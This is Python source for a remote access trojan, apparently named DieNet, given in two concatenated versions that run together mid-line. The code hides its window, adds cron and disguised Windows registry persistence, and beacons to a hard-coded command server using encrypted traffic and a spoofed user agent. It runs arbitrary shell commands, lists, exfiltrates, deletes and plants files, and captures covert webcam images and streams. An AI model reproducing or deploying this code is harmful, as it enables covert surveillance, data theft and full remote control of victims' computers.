import os
import sys
import json
import time
import base64
import random
import socket
import platform
import psutil
import requests
import subprocess
import threading
import ctypes
import uuid
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import hashlib

# ========================= CONFIG =========================
SERVER_URL = "https://velvetteam.pythonanywhere.com"
CHECKIN_INTERVAL = (25, 50)

AES_KEY = hashlib.sha256(b'dienet-velvetteam-secret-change-this').digest()

HOSTNAME = os.environ.get("COMPUTERNAME", platform.node()) or f"PC-{uuid.getnode():X}"[:15]

FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"

# Webcam
try:
    import cv2
    HAS_CV2 = True
except:
    HAS_CV2 = False

streaming = False

# ====================== STEALTH ======================
def hide_everything():
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    try:
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
    except:
        pass

def add_persistence():
    if platform.system() == "Linux":
        try:
            exe_path = os.path.abspath(__file__)
            cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot nohup python3 {exe_path} >/dev/null 2>&1 &") | crontab -'
            subprocess.run(cron_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

# ====================== CRYPTO & NETWORK ======================
def aes_encrypt(data: dict) -> str:
    iv = os.urandom(12)
    aesgcm = AESGCM(AES_KEY)
    ct = aesgcm.encrypt(iv, json.dumps(data).encode(), None)
    return base64.b64encode(iv + ct).decode()

def aes_decrypt(token: str) -> dict:
    try:
        raw = base64.b64decode(token)
        iv, ct = raw[:12], raw[12:]
        aesgcm = AESGCM(AES_KEY)
        return json.loads(aesgcm.decrypt(iv, ct, None))
    except:
        return None

def enc_post(endpoint: str, payload: dict):
    try:
        headers = {"User-Agent": FAKE_UA}
        data = {"enc": aes_encrypt(payload)}
        r = requests.post(f"{SERVER_URL}{endpoint}", json=data, headers=headers, timeout=15)
        if r.status_code == 200 and "enc" in r.json():
            return aes_decrypt(r.json()["enc"])
        return None
    except:
        return None

def get_system_info():
    try:
        cpu = psutil.cpu_percent(interval=0.8)
        ram = psutil.virtual_memory().percent
        disk_path = 'C:\\' if platform.system() == "Windows" else '/'
        disk = psutil.disk_usage(disk_path).percent
        disk_total = psutil.disk_usage(disk_path).total
        disk_free = psutil.disk_usage(disk_path).free

        mac = ':'.join([f"{(uuid.getnode() >> i) & 0xff:02x}" for i in range(0, 48, 8)][::-1])

        try:
            ip = requests.get('https://api.ipify.org', timeout=5, headers={"User-Agent": FAKE_UA}).text.strip()
        except:
            ip = socket.gethostbyname(socket.gethostname())

        return {
            "hostname": HOSTNAME,
            "ip": ip,
            "mac": mac,
            "os": f"{platform.system()} {platform.release()}",
            "cpu_percent": round(cpu, 1),
            "ram_percent": round(ram, 1),
            "disk_percent": round(disk, 1),
            "disk_total": disk_total,
            "disk_free": disk_free,
            "lat": 0.0, "lon": 0.0, "city": "", "country": "",
            "geo_method": "ip-fallback"
        }
    except:
        return {"hostname": HOSTNAME, "ip": "127.0.0.1", "mac": "00:00:00:00:00:00"}

# ====================== FILE LIST - FIXED FOR LINUX ======================
def get_file_list(start_path=None):
    files = []
    if start_path is None:
        start_path = os.path.expanduser("~")   # Start from home on Linux

    try:
        for root, dirs, filenames in os.walk(start_path, topdown=True, onerror=None):
            if root.count(os.sep) - start_path.count(os.sep) > 4:  # limit depth
                del dirs[:]
                continue
            if len(files) > 700:
                break

            for name in filenames[:30]:
                full = os.path.join(root, name)
                try:
                    size = os.path.getsize(full)
                    mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(full)))
                    files.append({
                        "path": full.replace("\\", "/"),
                        "name": name,
                        "is_dir": False,
                        "size": size,
                        "modified": mtime
                    })
                except:
                    continue

            for name in dirs[:10]:
                full = os.path.join(root, name)
                try:
                    mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(full)))
                    files.append({
                        "path": full.replace("\\", "/"),
                        "name": name,
                        "is_dir": True,
                        "size": 0,
                        "modified": mtime
                    })
                except:
                    continue
    except:
        pass
    return files

# ====================== COMMAND HANDLER ======================
def handle_command(cmd: str):
    global streaming
    if not cmd:
        return

    if cmd.startswith("shell:"):
        try:
            result = subprocess.run(cmd[6:], shell=True, capture_output=True, text=True, timeout=25)
            output = (result.stdout + result.stderr)[:48000]
        except Exception as e:
            output = f"Error: {str(e)}"
        enc_post("/api/cmdresult", {"hostname": HOSTNAME, "cmd": cmd[6:], "output": output})

    elif cmd == "filelist":
        files = get_file_list()
        enc_post("/api/filelist", {"hostname": HOSTNAME, "files": files})

    elif cmd.startswith("getfile:"):
        path = cmd[8:].strip()
        try:
            if os.path.isfile(path):
                with open(path, "rb") as f:
                    b64 = base64.b64encode(f.read(12*1024*1024)).decode()
                enc_post("/api/pushfile", {"hostname": HOSTNAME, "path": path.replace("\\", "/"), "data_b64": b64})
        except:
            pass

    elif cmd == "snapshot":
        if HAS_CV2:
            try:
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                cap.release()
                if ret:
                    _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
                    img_b64 = base64.b64encode(buffer).decode()
                    enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": img_b64})
            except:
                pass

    elif cmd == "stream_on":
        global streaming
        if not streaming:
            streaming = True
            threading.Thread(target=lambda: [enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": take_snapshot()}) or time.sleep(4) for _ in iter(int,1) if streaming], daemon=True).start()

    elif cmd == "uninstall":
        os._exit(0)

# ====================== MAIN ======================
def main():
    hide_everything()
    add_persistence()

    while True:
        try:
            info = get_system_info()
            resp = enc_post("/api/checkin", info)

            if resp and resp.get("command"):
                threading.Thread(target=handle_command, args=(resp["command"],), daemon=True).start()

            time.sleep(random.randint(*CHECKIN_INTERVAL))
        except:
            time.sleep(20)

if __name__ == "__main__":
    # This allows running in background without blocking terminal
    if os.fork():
        sys.exit(0)   # Parent exits, child continues in background
    os.setsid()       # Create new session
    if os.fork():
        sys.exit(0)   # Second fork for full daemon

    main()import os
import sys
import json
import time
import base64
import random
import socket
import platform
import psutil
import requests
import subprocess
import threading
import ctypes
import uuid
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import hashlib

# ========================= CONFIG =========================
SERVER_URL = "https://velvetteam.pythonanywhere.com"
CHECKIN_INTERVAL = (25, 50)

AES_KEY = hashlib.sha256(b'dienet-velvetteam-secret-change-this').digest()

HOSTNAME = os.environ.get("COMPUTERNAME", platform.node()) or f"PC-{uuid.getnode():X}"[:15]

FAKE_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36"

# Webcam support
try:
    import cv2
    HAS_CV2 = True
except:
    HAS_CV2 = False

streaming = False

# ====================== STEALTH ======================
def hide_everything():
    if platform.system() == "Windows":
        try:
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    try:
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
    except:
        pass

def add_persistence():
    sys_name = platform.system()
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)

    if sys_name == "Windows":
        try:
            import winreg
            key = r"Software\Microsoft\Windows\CurrentVersion\Run"
            reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(reg, "WindowsUpdateSvc", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(reg)
        except:
            pass
    elif sys_name == "Linux":
        try:
            cron_cmd = f'(crontab -l 2>/dev/null; echo "@reboot nohup {exe_path} >/dev/null 2>&1 &") | crontab -'
            subprocess.run(cron_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

# ====================== CRYPTO ======================
def aes_encrypt(data: dict) -> str:
    iv = os.urandom(12)
    aesgcm = AESGCM(AES_KEY)
    ct = aesgcm.encrypt(iv, json.dumps(data).encode(), None)
    return base64.b64encode(iv + ct).decode()

def aes_decrypt(token: str) -> dict:
    try:
        raw = base64.b64decode(token)
        iv, ct = raw[:12], raw[12:]
        aesgcm = AESGCM(AES_KEY)
        return json.loads(aesgcm.decrypt(iv, ct, None))
    except:
        return None

def enc_post(endpoint: str, payload: dict):
    try:
        headers = {"User-Agent": FAKE_UA}
        data = {"enc": aes_encrypt(payload)}
        r = requests.post(f"{SERVER_URL}{endpoint}", json=data, headers=headers, timeout=15)
        if r.status_code == 200 and "enc" in r.json():
            return aes_decrypt(r.json()["enc"])
        return None
    except:
        return None

# ====================== SYSTEM INFO ======================
def get_system_info():
    try:
        cpu = psutil.cpu_percent(interval=0.8)
        ram = psutil.virtual_memory().percent
        disk_path = 'C:\\' if platform.system() == "Windows" else '/'
        disk = psutil.disk_usage(disk_path).percent
        disk_total = psutil.disk_usage(disk_path).total
        disk_free = psutil.disk_usage(disk_path).free

        mac = ':'.join([f"{(uuid.getnode() >> i) & 0xff:02x}" for i in range(0, 48, 8)][::-1])

        try:
            ip = requests.get('https://api.ipify.org', timeout=5, headers={"User-Agent": FAKE_UA}).text.strip()
        except:
            ip = socket.gethostbyname(socket.gethostname())

        return {
            "hostname": HOSTNAME,
            "ip": ip,
            "mac": mac,
            "os": f"{platform.system()} {platform.release()}",
            "cpu_percent": round(cpu, 1),
            "ram_percent": round(ram, 1),
            "disk_percent": round(disk, 1),
            "disk_total": disk_total,
            "disk_free": disk_free,
            "lat": 0.0, "lon": 0.0, "city": "", "country": "",
            "geo_method": "ip-fallback"
        }
    except:
        return {"hostname": HOSTNAME, "ip": "127.0.0.1", "mac": "00:00:00:00:00:00"}

# ====================== WEBCAM ======================
def take_snapshot():
    if not HAS_CV2: return None
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 85])
            return base64.b64encode(buffer).decode()
    except:
        pass
    return None

def stream_loop():
    global streaming
    while streaming:
        img = take_snapshot()
        if img:
            enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": img})
        time.sleep(4)

# ====================== FIXED FILE LIST FOR LINUX ======================
def get_file_list(start_path="/"):
    files = []
    try:
        # On Linux, start from home if root is not accessible
        if start_path == "/" and platform.system() == "Linux":
            start_path = os.path.expanduser("~")

        for root, dirs, filenames in os.walk(start_path, topdown=True, onerror=None):
            # Limit depth and count to avoid hanging
            if root.count(os.sep) - start_path.count(os.sep) > 3:
                del dirs[:]  # Don't go deeper than 3 levels
            if len(files) > 600:
                break

            for name in filenames[:40]:   # limit per folder
                full_path = os.path.join(root, name)
                try:
                    size = os.path.getsize(full_path)
                    mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(full_path)))
                    files.append({
                        "path": full_path.replace("\\", "/"),
                        "name": name,
                        "is_dir": False,
                        "size": size,
                        "modified": mtime
                    })
                except:
                    continue

            for name in dirs[:15]:
                full_path = os.path.join(root, name)
                try:
                    mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(os.path.getmtime(full_path)))
                    files.append({
                        "path": full_path.replace("\\", "/"),
                        "name": name,
                        "is_dir": True,
                        "size": 0,
                        "modified": mtime
                    })
                except:
                    continue
    except:
        pass

    # Fallback: at least send home directory if nothing found
    if not files and platform.system() == "Linux":
        try:
            files = get_file_list(os.path.expanduser("~"))
        except:
            pass

    return files

# ====================== COMMAND HANDLER ======================
def handle_command(cmd: str):
    global streaming
    if not cmd:
        return

    if cmd.startswith("shell:"):
        try:
            result = subprocess.run(cmd[6:], shell=True, capture_output=True, text=True, timeout=25)
            output = (result.stdout + result.stderr)[:48000]
        except Exception as e:
            output = f"Error: {str(e)}"
        enc_post("/api/cmdresult", {"hostname": HOSTNAME, "cmd": cmd[6:], "output": output})

    elif cmd == "filelist":
        files = get_file_list("/")
        enc_post("/api/filelist", {"hostname": HOSTNAME, "files": files})

    elif cmd.startswith("getfile:"):
        path = cmd[8:].strip()
        try:
            if os.path.isfile(path):
                with open(path, "rb") as f:
                    b64 = base64.b64encode(f.read(12 * 1024 * 1024)).decode()  # 12MB limit
                enc_post("/api/pushfile", {"hostname": HOSTNAME, "path": path.replace("\\", "/"), "data_b64": b64})
        except:
            pass

    elif cmd.startswith("delete:"):
        path = cmd[7:].strip()
        try:
            if os.path.isfile(path):
                os.remove(path)
        except:
            pass

    elif cmd.startswith("putfile:"):
        resp = enc_post(f"/api/pendingupload/{HOSTNAME}", {})
        if resp and resp.get("status") == "ok":
            try:
                dest = resp.get("dest_path")
                os.makedirs(os.path.dirname(dest), exist_ok=True)
                with open(dest, "wb") as f:
                    f.write(base64.b64decode(resp.get("data_b64", "")))
            except:
                pass

    elif cmd == "snapshot":
        img = take_snapshot()
        if img:
            enc_post("/api/snapshot", {"hostname": HOSTNAME, "image_b64": img})

    elif cmd == "stream_on":
        if not streaming:
            streaming = True
            threading.Thread(target=stream_loop, daemon=True).start()

    elif cmd == "stream_off":
        streaming = False

    elif cmd == "uninstall":
        if platform.system() == "Windows":
            try:
                import winreg
                key = r"Software\Microsoft\Windows\CurrentVersion\Run"
                reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_ALL_ACCESS)
                winreg.DeleteValue(reg, "WindowsUpdateSvc")
            except:
                pass
        os._exit(0)

# ====================== MAIN ======================
def main():
    hide_everything()
    add_persistence()

    if platform.system() == "Windows":
        try:
            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\DieNetMutex")
            if ctypes.windll.kernel32.GetLastError() == 0xB7:
                sys.exit(0)
        except:
            pass

    while True:
        try:
            info = get_system_info()
            resp = enc_post("/api/checkin", info)

            if resp and resp.get("command"):
                threading.Thread(target=handle_command, args=(resp["command"],), daemon=True).start()

            time.sleep(random.randint(*CHECKIN_INTERVAL))

        except:
            time.sleep(20)

if __name__ == "__main__":
    main()
